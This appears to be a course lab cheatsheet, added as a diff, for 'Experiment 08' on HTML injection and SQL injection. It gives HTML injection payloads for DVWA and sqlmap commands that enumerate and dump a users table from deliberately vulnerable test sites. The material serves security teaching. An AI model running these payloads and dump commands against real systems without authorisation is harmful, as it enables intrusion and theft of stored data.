@@ -1,0 +1,57 @@
+================================================================
+ EXPERIMENT 08 - SQLi & HTML INJECTION CHEATSHEET
+ Target: DVWA | Tool: SQLMAP
+================================================================
+
+--- LO1: HTML CODE INJECTION (DVWA - Reflected XSS field) ---
+
+# Step 1: Test reflection
+Input: A
+-> Check if "A" is reflected back in the response (indicates possible injection)
+
+# Step 2: Basic HTML injection payloads
+<h1>HTML Injection Successful</h1>
+<p>This content was injected into the webpage.</p>
+
+<img src="https://miro.medium.com/max/400/0*y2OAF_DSarBAjihO.jpg">
+
+--- LO2: SQL INJECTION (SQLMAP) ---
+
+# Step 1: Help / command list
+sqlmap --help
+
+# Step 2: Fetch database names
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+  (Type Y to skip other-DBMS tests, N to skip full MySQL test set)
+
+# Example against DVWA (with session cookie, low security):
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<your_session_id>; security=low" --batch --dbs
+
+# Step 3: Fetch tables from a database
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+
+# Step 4: Fetch columns from a table
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+
+# Step 5: Dump data from a table
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
+
+================================================================
+ USEFUL SQLMAP FLAGS
+================================================================
+-u <url>        Target URL
+--dbs           Enumerate databases
+-D <db>         Specify database
+--tables        Enumerate tables
+-T <table>      Specify table
+--columns       Enumerate columns
+--dump          Dump table data
+--cookie        Pass session cookie (for authenticated pages)
+--batch         Non-interactive mode (auto default answers)
+
+================================================================
+ LEARNING OUTCOMES
+================================================================
+LO1: Perform HTML Injection & identify vulnerable parameters
+LO2: Detect and exploit SQL Injection using SQLmap
